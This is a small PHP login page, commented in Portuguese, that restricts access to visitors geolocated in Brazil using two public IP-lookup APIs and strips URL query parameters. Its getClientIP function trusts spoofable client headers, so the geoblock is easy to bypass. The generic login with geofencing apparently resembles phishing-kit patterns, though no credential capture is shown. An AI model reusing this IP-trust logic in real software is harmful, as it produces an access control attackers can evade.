<?php
/*---------------------------------------------------------------
 | index.php – página de login + bloqueio geográfico (BR only)
 | 1ª API: api.country.is     2ª API: get.geojs.io
 *--------------------------------------------------------------*/

/* IP real do visitante */
function getClientIP(): string {
  return $_SERVER['HTTP_CLIENT_IP']
      ?? $_SERVER['HTTP_X_FORWARDED_FOR']
      ?? $_SERVER['REMOTE_ADDR'];
}

/* Descobre o país usando duas APIs leves */
function getCountry(string $ip): ?string {
  // 1) api.country.is -----------------------------------------
  $json = @file_get_contents("https://api.country.is/{$ip}");
  if ($json && ($d = json_decode($json, true)) && !empty($d['country'])) {
    return $d['country'];
  }

  // 2) get.geojs.io -------------------------------------------
  $json = @file_get_contents("https://get.geojs.io/v1/ip/country/{$ip}.json");
  if ($json && ($d = json_decode($json, true)) && !empty($d['country'])) {
    return $d['country'];
  }

  return null;  // falhou
}

/* Bloqueia quem não for do Brasil */
if (getCountry(getClientIP()) !== 'BR') {
  http_response_code(403);
  exit('Acesso bloqueado: apenas permitido para o Brasil.');
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Login – Sistema Seguro</title>
  <link rel="stylesheet" href="style.css">
  <!-- Remove parâmetros de query nerds (UTM etc.) -->
  <script>
    if (location.search) location.href = location.origin + location.pathname;
  </script>
  <script defer src="script.js"></script>
</head>
<body>
  <div class="login-container">
    <h2>Login</h2>

    <form id="loginForm" autocomplete="off">
      <input id="access"   placeholder="Access"   required>
      <input id="password" placeholder="Password" type="password" required>
      <button type="submit">Logar</button>
      <p id="error-msg" class="error"></p>
    </form>

  </div>
</body>
</html>
